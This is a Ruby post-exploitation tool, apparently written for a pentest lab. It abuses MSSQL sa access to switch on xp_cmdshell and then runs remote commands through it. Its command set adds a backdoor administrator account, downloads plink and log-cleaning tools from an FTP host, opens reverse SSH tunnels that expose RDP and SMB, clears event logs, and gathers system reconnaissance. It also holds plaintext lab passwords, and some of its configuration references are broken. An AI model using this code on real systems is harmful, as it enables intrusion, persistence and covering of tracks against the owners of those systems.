require 'tiny_tds'

# v1.0
# 24.9.2014
# Author: sciberboy


class XpCmdShell


  def initialize (arg)

    setIpCloud

    #shh
    @ssh_user = arg[:ssh][:ssh_user]
    @ssh_pass = arg[:ssh][:ssh_pass]
    @ssh_port = arg[:ssh][:ssh_port]
    case @net
      when  :private then  @ssh_ip = arg[:ssh][:ip]
      when  :local then @ssh_ip = arg[:ssh][:ip2]
      when  :cloud then @ssh_ip = arg[:ssh][:ipCloud]
    end

    #ftp
    @ftp_user = arg[:ftp][:ftp_user]
    @ftp_pass = arg[:ftp][:ftp_pass]
    @ftp_port = arg[:ftp][:ftp_port]
    case @net
      when  :private then  @ftp_ip = arg[:ftp][:ip]
      when  :local then @ftp_ip = arg[:ftp][:ip2]
      when  :cloud then @ftp_ip = arg[:ftp][:ipCloud]
    end
  #sql
    @mssql_user = arg[:mssql][:mssql_user]
    @mssql_pass = arg[:mssql][:mssql_pass]
    @mssql_port = arg[:mssql][:mssql_port]
    case @net
      when  :private then  @mssql_ip = arg[:mssql][:ip]
      when  :local then @mssql_ip = arg[:mssql][:ip2]
      when  :cloud then @mssql_ip = arg[:mssql][:ipCloud]
    end

    puts "The MSSQL PIVOT is #{@mssql_ip}"

    if @net.eql? :private then puts "private" end

  #plink
    case @net
      when  :private then  @target_ip = arg[:target][:ip]
      when  :local then @target_ip = arg[:target][:ip2]
      when  :cloud then @target_ip = arg[:target][:ipCloud]
    end
  #windows user
    @win_pass = arg[:creds][:hx_pass]
    @win_user = arg[:creds][:hx_user]


    @cmd = {
        :makeCmdShellActive => [
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
        ],
        :makeCmdShellInactive => [
            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;"
        ],
        :createWin => [
            "EXEC xp_cmdshell 'net user /add #{@win_user} #{@win_pass}'",
            "EXEC xp_cmdshell 'net localgroup administrators #{@win_user} /add'"
        ],
        :makeUserActive =>[
            "EXEC xp_cmdshell 'NET USER #{@win_user} /DOMAIN /ACTIVE:YES'"],
        :makeUserInActive =>[
            "EXEC xp_cmdshell 'NET USER #{@win_user} /DOMAIN /ACTIVE:NO'"],
        :delWinUser => [
            "EXEC xp_cmdshell 'net user #{@win_user} /del'"],
        :tree => [
            "EXEC xp_cmdshell 'tree c:\\'"],
        :ftpGetPlink => [
            "EXEC xp_cmdshell 'echo open #{@ftp_ip} > get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_user} >> get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_pass} >> get.txt'",
            "EXEC xp_cmdshell 'echo get plink.exe plink.exe.txt >> get.txt'",
            "EXEC xp_cmdshell 'echo bye >> get.txt'",
            "EXEC xp_cmdshell 'ftp -s:get.txt'",
            "EXEC xp_cmdshell 'ren plink.exe.txt plink.exe'",
            "EXEC xp_cmdshell 'del get.txt'"
        ],
        :ftpGetClearEv=> [
            "EXEC xp_cmdshell 'echo open #{@ftp_ip} > get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_user} >> get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_pass} >> get.txt'",
            "EXEC xp_cmdshell 'echo get clearev.vbs clearev.txt >> get.txt'",
            "EXEC xp_cmdshell 'echo get cleanafterme.exe cleanafterme.txt >> get.txt'",
            "EXEC xp_cmdshell 'echo bye >> get.txt'",
            "EXEC xp_cmdshell 'ftp -s:get.txt'",
            "EXEC xp_cmdshell 'ren clearev.txt clearev.vbs'",
            "EXEC xp_cmdshell 'ren cleanafterme.txt cleanafterme.exe'",
            "EXEC xp_cmdshell 'del get.txt'"
        ],
        :ftpGetClearSSH => [
            "EXEC xp_cmdshell 'echo open #{@ftp_ip} > get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_user} >> get.txt'",
            "EXEC xp_cmdshell 'echo #{@ftp_pass} >> get.txt'",
            "EXEC xp_cmdshell 'echo get clearSSH.vbs clearSSH.txt >> get.txt'",
            "EXEC xp_cmdshell 'echo bye >> get.txt'",
            "EXEC xp_cmdshell 'ftp -s:get.txt'",
            "EXEC xp_cmdshell 'ren clearSSH.txt clearSSH.vbs'",
            "EXEC xp_cmdshell 'del get.txt'"
        ],
        :forward_3389_to_3388 =>[
            "EXEC xp_cmdshell'Echo N > ssh.txt'",
            "EXEC xp_cmdshell 'plink.exe  -N -l #{@ssh_user} -pw #{@ssh_pass} -P #{@ssh_port} -R 3388:#{@target_ip}:3389 #{@ssh_ip}< ssh.txt'",
            "EXEC xp_cmdshell 'del ssh.txt'",
        ],

        :forward_445_From_445 =>[
            "EXEC xp_cmdshell'Echo N > ssh.txt'",
            "EXEC xp_cmdshell 'plink.exe  -N -l #{@ssh_user} -pw #{@ssh_pass} -P #{@ssh_port} -R 445:#{@target_ip}:445 #{@ssh_ip}< ssh.txt'",
            "EXEC xp_cmdshell 'del ssh.txt'"
        ],
        :doClearEv => [
            "EXEC xp_cmdshell 'cscript clearev.vbs'",
        ],
        :doWinRestart => [
            "EXEC xp_cmdshell 'shutdown -r -f -t 2'", # force restart in 2 seconds
            "EXEC xp_cmdshell 'cscript clearev.vbs'"
        ],
        :tasklist => [ #show all running processes
            "EXEC xp_cmdshell 'tasklist'"
        ],
        :taskkill => [
            "EXEC xp_cmdshell 'taskkill /pid 576 /f'" #change the pid when you have run tasklist
        ],
        :ipconfig => [
            "EXEC xp_cmdshell 'ipconfig'"
        ],

        :arp => [
            "EXEC xp_cmdshell 'tasklist'"
        ],

        :dir =>[
            "EXEC xp_cmdshell 'dir C:\\'"
        ],

        :net_users =>[
            "EXEC xp_cmdshell 'net users'"
        ],

        :net_start =>[
            "EXEC xp_cmdshell 'net start'"
        ],

        :net_use =>[
            "EXEC xp_cmdshell 'net use'"
        ],

        :netstat =>[
            "EXEC xp_cmdshell 'netstat -ano'"
        ],

        :tasklist =>[
            "EXEC xp_cmdshell 'tasklist'"
        ],

        :arp =>[
            "EXEC xp_cmdshell 'arp -a'"
        ],
        :ipconfig =>[
            "EXEC xp_cmdshell 'ipconfig /all'"
        ],
        :set =>[
        "EXEC xp_cmdshell 'set'"
        ],

        :systeminfo =>[
            "EXEC xp_cmdshell 'systeminfo'"
        ],
    }
  end

  def setIpPublic
    @net = :public #192.168.228.0/24
    puts 'IP is Public'
  end

  def setIpPrivate
    @net = :private #192.168.1.0/24
    puts 'IP is set to Private:  192.168.1.0/24'
  end

  def setIpCloud
    @net = :cloud
  end


  def doCmd(cmdArr)
    begin
      client = TinyTds::Client.new(:username => @mssql_user, :password => @mssql_pass, :host => @mssql_ip, :port => @mssql_port)

      cmdArr.each do |key|
        lineArr = @cmd[key]
        lineArr.each do |line|
          result = client.execute(line)
          result.each do |row|
            puts row.to_s[12..-3]
          end
        end
        puts ""
      end
    rescue Exception => e
      puts "[-] " + e.message
      exit
      # puts e.backtrace.inspect
    end
    client.close

  end #def

end # Class


config = {


    :lab1 => { # LAB1 - HX
          :role => 'PENTEST',
          :name => 'LAB-1',
          :ip =>'192.168.1.201',
          :ip2 => '192.168.228.45',
          :os => 'XP',
          :flavour => 'PRO,SP3',
          :root => 'Administrator',
          :root_pass => '!dowN09',
          :ftp_user =>'ftp_user',
          :ftp_pass => 'ftp_pass',
          :ftp_port => '21',
          :ssh_user => 'ssh_account',
          :ssh_pass => 'ssh_pass',
          :ssh_port => '22',
          :host => 'NOTEBOOK',
          :vm => TRUE,
      },

      :lab2 => { # LAB2 - MSSQL
          :role => 'PIVOT',
          :name => 'Lab-2',
          :ip => '192.168.1.202',
          :ip2 => '192.168.228.50',
          :os => 'XP',
          :flavour => 'PRO,SP3',
          :root => 'Administrator',
          :root_pass => 'LUNCH701',
          :user => 'user',
          :user_pass => 'user_pass',
          :mssql_user => 'sa',
          :mssql_pass => 'SYSADM',
          :mssql_port => '1035',
          :host => 'NOTEBOOK',
          :vm => TRUE,
      },


    :creds_1 => { # CREDS
        :hx_user => 'hx0r',
        :hx_pass => 'pass',

    },


} #config


xp = XpCmdShell.new (
                     {
                      :ssh => config[:lab1],
                      :ftp => config[:lab1],
                      :mssql => config[:radmin],
                      :target => config[:radmin],
                      :creds => config[:creds_1],
      })


xp.doCmd ([:dir])
#xp.doCmd ([:forward_3389_to_3388])
#xp.doCmd ([:ftpGetPlink])